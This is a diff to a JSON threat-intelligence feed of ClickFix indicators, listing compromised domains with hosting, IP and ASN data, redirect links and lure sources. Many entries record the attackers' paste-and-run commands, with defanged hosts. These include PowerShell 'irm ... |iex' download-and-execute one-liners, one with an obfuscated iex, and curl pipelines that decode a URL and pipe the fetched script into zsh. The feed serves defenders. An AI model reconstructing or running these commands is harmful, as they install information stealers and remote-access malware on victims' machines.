@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5003,
+ "count": 5001,
  "indicators": [
   {
    "indicator": "100porcentopiaui.com.br",
@@ -25207,58 +25207,6 @@
    ]
   },
   {
-   "indicator": "artificialworld.co.uk",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-05",
-   "offline_since": null,
-   "url": "https://artificialworld.co.uk/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hetzner",
-   "dns": "hostinggram.com",
-   "ip": "135.181.161.16",
-   "asn": "AS24940",
-   "org": "HETZNER-AS Hetzner Online GmbH, DE",
-   "country": "FI",
-   "ips": [
-    {
-     "ip": "135.181.161.16",
-     "asn": "AS24940",
-     "org": "HETZNER-AS Hetzner Online GmbH, DE",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "artificialworld.co.uk",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
-   ],
-   "connects_to": [
-    "t-trustrest.com",
-    "xorados.com",
-    "groverudder12.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "artline-tattoo.ch",
    "type": "domain",
    "category": "clickfix",
@@ -39511,11 +39459,12 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "irm 'ncheck-brows[.]beer/[id]'|iex;"
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex;"
    ],
    "connects_to": [
     "hagosuro.lc",
     "t-trustrest.com",
+    "codes.browse-cdn.beer",
     "ncheck-brows.beer",
     "xorados.com",
     "groverudder12.com"
@@ -80195,11 +80144,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex;"
    ],
    "connects_to": [
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ],
    "lure_from": []
   },
@@ -102896,7 +102847,7 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
@@ -113328,7 +113279,7 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
@@ -115123,7 +115074,10 @@
     "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "hmstinget.no",
@@ -115314,13 +115268,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "xorados.com",
     "hagosuro.lc",
+    "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "lepafonso.bz",
     "trustchecknes.com",
     "groverudder12.com"
    ],
@@ -116338,7 +116293,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "hookedon.co.za",
@@ -116497,7 +116455,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "horavhmle.sk",
@@ -116649,7 +116610,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "hospitalhlbaja.com",
@@ -118625,56 +118589,6 @@
    "lure_from": []
   },
   {
-   "indicator": "iatms-eg.org",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-30",
-   "last_seen": "2026-10-31",
-   "last_online": "2026-11-05",
-   "offline_since": null,
-   "url": "https://iatms-eg.org/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "92.113.16.98",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "DE",
-   "ips": [
-    {
-     "ip": "92.113.16.98",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "iatms-eg.org",
-     "status": "online",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=b5b1|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=b5b1|iex</span>"
-   ],
-   "connects_to": [
-    "verifyidentrob01.cc"
-   ],
-   "lure_from": [
-    "ubbrobccheck20.cc"
-   ]
-  },
-  {
    "indicator": "ibage.com.br",
    "type": "domain",
    "category": "clickfix",
@@ -119633,7 +119547,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "idskw.com",
@@ -121155,7 +121072,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "imaginatlh.com",
@@ -122375,7 +122295,9 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "ubbrobccheck20.cc"
+    "ubbrobccheck20.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -129050,7 +128972,10 @@
     "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "jaimejaime.com.do",
@@ -129201,7 +129126,9 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -130279,7 +130206,9 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -136510,7 +136439,7 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
@@ -137701,13 +137630,14 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "hagosuro.lc",
     "trustchecknes.com",
     "groverudder12.com"
    ],
@@ -145050,12 +144980,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "lepafonso.bz",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
